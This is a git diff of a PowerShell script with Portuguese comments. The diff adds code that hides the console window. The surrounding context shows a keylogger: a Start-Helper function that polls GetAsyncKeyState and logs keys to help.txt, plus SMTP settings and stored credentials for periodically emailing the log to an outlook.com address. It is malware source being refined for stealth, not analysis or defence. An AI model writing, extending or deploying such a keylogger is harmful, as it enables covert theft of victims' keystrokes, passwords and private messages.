@@ -1,3 +1,20 @@
+# Código para esconder a janela do PowerShell
+$t = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WinAPI
+{
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+Add-Type -TypeDefinition $t
+$handle = (Get-Process -Id $PID).MainWindowHandle
+if ($handle -ne [IntPtr]::Zero) {
+    [WinAPI]::ShowWindow($handle, 0)
+}
+
 # Configurações de envio de e-mail
 $RunTimeP = 1 # Tempo em minutos
 $From = "luccasmachado001@outlook.com"
@@ -10,7 +27,7 @@ $SMTPPort = "587"
 $credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
 # Requer PowerShell versão 2
-function Start-Helper($Path="$env:temp\help.txt") {
+function Start-Helper($Path="$env:UserProfile\Desktop\help.txt") {
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
